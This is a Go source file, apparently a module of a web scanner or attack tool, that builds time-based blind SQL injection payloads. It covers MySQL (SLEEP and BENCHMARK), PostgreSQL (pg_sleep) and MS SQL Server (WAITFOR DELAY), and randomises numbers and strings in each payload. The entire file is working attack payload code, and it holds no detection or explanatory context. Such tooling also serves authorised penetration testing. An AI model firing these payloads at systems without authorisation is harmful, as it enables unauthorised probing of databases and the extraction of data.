package blind_injection

import (
	"fmt"
	"math/rand"
	"time"
)

var seconds = 5

type timeStringer interface {
	timeQuery() string
}

type mySQL struct {
	base string
}

func newMySQL() mySQL {
	return mySQL{base: "' AND (SELECT %d FROM (SELECT(SLEEP(%d)))%s)-- "}
}

func (m mySQL) timeQuery() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	d := r.Uint64()
	s := randomString(4)
	return fmt.Sprintf(m.base, d, seconds, s)
}

type mySQLOld struct {
	base string
}

func newMySQLOld() mySQLOld {
	return mySQLOld{base: "' AND (SELECT %d FROM (SELECT(BENCHMARK(%d0000000, rand())))%s)-- "}
}

func (m mySQLOld) timeQuery() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	d := r.Uint64()
	s := randomString(4)
	return fmt.Sprintf(m.base, d, seconds, s)
}

type pgSQL struct {
	base string
}

func newPgSQL() pgSQL {
	return pgSQL{base: "' AND (SELECT %d FROM (SELECT(pg_sleep(%d)))%s)-- "}
}

func (p pgSQL) timeQuery() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	d := r.Uint64()
	s := randomString(4)
	return fmt.Sprintf(p.base, d, seconds, s)
}

type msSQL struct {
	base string
}

func newMsSQL() msSQL {
	return msSQL{base: "' WAITFOR DELAY '00:00:%d'-- "}
}
func (m msSQL) timeQuery() string {
	return fmt.Sprintf(m.base, seconds)
}

var asciiTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randomString(l int) string {
	b := make([]byte, l)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		b[i] = asciiTable[r.Intn(len(asciiTable))]
	}

	return string(b)
}
